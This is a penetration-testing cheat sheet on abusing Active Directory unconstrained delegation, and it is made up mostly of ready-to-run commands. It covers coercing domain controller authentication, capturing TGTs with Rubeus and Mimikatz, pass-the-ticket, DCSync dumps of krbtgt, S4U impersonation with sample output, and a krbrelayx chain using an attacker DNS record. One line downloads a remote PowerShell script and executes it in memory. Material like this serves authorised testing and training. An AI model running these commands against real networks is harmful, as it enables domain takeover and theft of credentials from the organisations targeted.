# Enumeration
```powershell
# PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname, samaccountname |FL

# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select DNSHostName, SamAccountName | FL
```

# Forced Authentication

When a system has Unconstrained Delegation enabled, a potential attack vector is to force other users or systems to authenticate against the host which is configured for unconstrained delegation.

By doing so we can force the victim user / computer account to store a copy of their TGT into the compromised system.

```powershell
# Invoke-SpoolSample
# Load into memory amd execute
IEX (IWR -UseBasicParsing https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
Invoke-SpoolSample -Command "[Target Sever] [Listening Host]"

# SharpSystemTriggers
# https://github.com/cube0x0/SharpSystemTriggers
# Compiled Binaries: https://github.com/The-Viper-One/RedTeam-Pentest-Tools/tree/main/Coercion
.\SharpEfsTriggeEfs.exe <Target IP> <Listener IP> <API call>
.\SharpEfsTriggeEfs.exe 192.168.1.10 192.168.1.250 EfsRpcEncryptFileSrv
```
# Ticket Acquisition
```powershell
# Rubeus
Invoke-Rubeus -Command "monitor interval:2 /nowrap"
Invoke-Rubeus -Command "monitor interval:2 /nowrap /targetuser:administrator"

# Mimikatz
Invoke-Mimikatz -Command '"token::elevate "sekurlsa::tickets /export"'
Invoke-Mimikatz -Command '""token::elevate" "kerberos::list /export"'

# TGT_Monitor
TGT_Monitor -EncryptionKey "Password123" -Timeout 60
TGT_Monitor -EncryptionKey "Password123" -Read

# PsMapExec (Remote)(Monitor for 3 minutes)
PsMapExec -Targets APPSRV01 -Method WMI -Username User -Password Password -Module KerbDump -Option kerbdump:monitor:3 -ShowOutput
```
# Pass-the-Ticket 
Pass the extracted ticket into the current or new session
```powershell
# Rubeus
# Pass ticket into seperate session (Preffered)
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /show /ticket:[Base64 ticket] /ptt"

# Mimikatz
# Pass ticket into current session
Invoke-Mimikatz -Command '"kerberos::ptt [Ticket-Name.kirbi]"'
Invoke-Mimikatz -Command '"kerberos::list"'
Invoke-Mimikatz -Command '"misc::cmd"'

# PsMapExec
# Inject into current session
PsMapExec -Method Inject -Ticket [Base64 Ticket] -Verbose

# Authenticate to remote host
PsMapExec -Targets All -Methid WMI -Ticket [Base64 Ticket] -Command whoami
```
# Unconstrained --> DcSync
The best and most likely attack vector for Unconstrained Delegation is to force a Domain Controller to authenticate to the server configured with Unconstrained Delegation (Shown Above). When this is the case and we capture a TGT for the domain controller the most ideal next step is to perform a DCSync attack with the machine ticket.

```powershell
# Mimikatz
Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /all"'

# PsMapExec
PsMapExec -Targets DC01.corp.com -method DCSync -ShowOutput -Ticket "doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGx..."
PsMapExec -Targets DC01.corp.com -method DCSync -Option "DCsync:corp\krbtgt" -ShowOutput -Ticket "doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGx..."
```

# Machine Account --> Machine Account Admin
By default, machine accounts do not have local administrative rights over themselves. For example, if we force a Domain Controller to authenticate to a system with Unconstrained Delegation and then capture the machine account's TGT, we will not be able to access it from an administrative context.

However, we can leverage Rubeus with the `/self` flag to impersonate a user within the domain and create a TGS for that impersonated user back to the machine account. A requirement here is to ensure the user we choose to impersonate has local administrative rights over the machine account.

In the below command. The value of `$ticket` is a TGT for the domain controller `cdc01.prod.corp1.com` which was captured from a system configured with Unconstrained Delegation.

```powershell
Invoke-Rubeus -Command "s4u /impersonateuser:admin /self /altservice:cifs/cdc01.prod.corp1.com /user:cdc01$ /ticket:$ticket /nowrap"

<#
[*] Action: S4U

[*] Building S4U2self request for: 'CDC01$@PROD.CORP1.COM'
[*] Using domain controller: cdc01.prod.corp1.com (192.168.210.70)
[*] Sending S4U2self request to 192.168.210.70:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/cdc01.prod.corp1.com,ldap/cdc01.prod.corp1.com'
[*] Got a TGS for 'administrator' to 'cifs@PROD.CORP1.COM'
[*] base64(ticket.kirbi):

      doIFijCCBYagAwIBBaEDAgEWooIEezCC...

[+] Ticket successfully imported!

PS C:\Users\offsec.PROD> dir \\cdc01.prod.corp1.com\c$


    Directory: \\cdc01.prod.corp1.com\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        4/20/2020   3:53 AM                Program Files
d-----        4/20/2020   3:54 AM                Program Files (x86)
d-----        4/20/2020   3:40 AM                SQL2019
d-----        4/20/2020   4:20 AM                Tools
d-r---       10/10/2024  11:05 PM                Users
d-----        4/20/2020   3:58 AM                Windows
#>
```
# KRBRelayx

The whole attack chain can also be performed with krbrelayx.py. This method requires initial access to the Unconstrained target systems NTLM and AES256 Keys (Mimikatz, secretsudmp).

```python

# Authenticate to the machine account configured with Unconstained Delegation
python3 addspn.py -u corp\\files01\$ -p <Target NTLM Hash> -s HOST/evil.corp.com DC01.corp.com --additional 

# Upate DNS records on the target system
python3 dnstool.py -u corp\\files01\$ -p <Target NTLM Hash> -r evil.corp.com -d 192.168.45.197 --action add DC01.corp.com

# Wait a few minutes then confirm against the DNS / DC Server records are updated
nslookup evil.corp.com 192.168.236.100

# Execute krbrelayx with the AES256 hash of the target system
sudo python3 krbrelayx.py -aesKey <Target AES256 Hash>

# Coerce authentication from the DC to the unconstrained target system
python3 printerbug.py corp.com/'files01$'@DC01.corp.com -hashes <Target NTLM Hash> evil.corp.com

# Export the TGT for use with secretsdump and DCSync
export KRB5CCNAME='DC01$@CORP.COM_krbtgt@CORP.COM.ccache'
secretsdump.py DC01.corp.com -dc-ip 192.168.236.100 -just-dc-user 'CORP\krbtgt' -k -no-pass

```
